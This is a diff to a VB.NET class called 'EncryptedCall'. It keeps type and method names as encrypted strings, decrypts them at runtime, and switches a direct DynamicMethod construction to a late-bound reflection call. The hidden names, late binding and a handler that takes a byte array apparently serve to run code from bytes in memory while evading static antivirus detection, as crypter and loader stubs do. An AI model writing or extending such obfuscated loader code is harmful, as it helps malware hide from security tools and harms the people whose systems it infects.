@@ -14,7 +14,8 @@ Public Class EncryptedCall
                                         "FeqrI%Wkxq", _
                                         "Hqnz", _
                                         "HqnzJiuv", _
-                                        "Lr{urm"}
+                                        "Lr{urm", _
+                                        "Fvjg{mRx~$n|ru"}
     Private Shared q_Opc As String() = {"Ohfxng9", _
                                         "Feqr", _
                                         "Ohfxng:", _
@@ -26,9 +27,10 @@ Public Class EncryptedCall
     Private Shared q_Typ As String() = {"V}xzlu7\prysr(z%%BV-.}*|+9", _
                                         "V}xzlu7Kn$v(p($(", _
                                         "V}xzlu7\$z%w|u?U&%)#'}/m$27+&hw3X|v}sxqUs{$v(*", _
-                                        "Pmhxv{xp#:cw&)r~Uu,#zF\-,0*.(uWjx}qlo~:cs%'z%%yy"}
+                                        "Pmhxv{xp#:cw&)r~Uu,#zF\-,0*.(uWjx}qlo~:cs%'z%%yy", _
+                                        "V}xzlu7\prysr(z%%BZ'$0G^8.~/,fQjzowm"}
     Private Shared i_Opc(7) As Object
-    Private Shared i_Typ(3) As Object
+    Private Shared i_Typ(4) As Object
 #End Region
 
 #Region "Helpers Methods"
@@ -36,11 +38,11 @@ Public Class EncryptedCall
         For i = 0 To q_Str.Length - 1
             q_Str(i) = Decrypt(q_Str(i))
         Next
-        For i = 0 To 8 - 1
+        For i = 0 To q_Opc.Length - 1
             i_Opc(i) = GetOpcodesByName(Decrypt(q_Opc(i)))
         Next
 
-        For i = 0 To 4 - 1
+        For i = 0 To q_Typ.Length - 1
             i_Typ(i) = GetTypeByName(Decrypt(q_Typ(i)))
         Next
     End Sub
@@ -85,7 +87,8 @@ Public Class EncryptedCall
 
         Initiate()
 
-        Dim handler As New DynamicMethod("", GetType(Object), New [Type]() {GetType(Byte()), GetType(String), GetType(String), GetType(Object())})
+        Dim handler As Object = NewLateBinding.LateGet(Nothing, i_Typ(1), q_Str(9), New Object() {i_Typ(4), "", GetType(Object), New [Type]() {GetType(Byte()), GetType(String), GetType(String), GetType(Object())}}, Nothing, Nothing, Nothing)
+
         Dim IL As Object = NewLateBinding.LateGet(handler, Nothing, q_Str(0), Nothing, Nothing, Nothing, Nothing)
 
         Dim args_0() As Type = New [Type]() {GetType(Byte())}
